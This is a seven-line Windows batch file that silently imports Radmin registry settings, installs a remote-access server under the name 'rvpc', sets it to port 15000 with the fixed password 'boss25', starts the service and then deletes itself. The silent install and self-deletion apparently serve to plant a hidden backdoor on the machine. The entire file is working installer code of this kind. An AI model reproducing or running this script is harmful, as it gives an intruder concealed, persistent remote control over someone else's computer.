@echo off
@regedit /s radmin.reg
@regedit /s rservice.reg
@rvpc /install /silence
@rvpc /port:15000 /pass:boss25 /save /silence
@net start r_server /silence
@del go.bat /y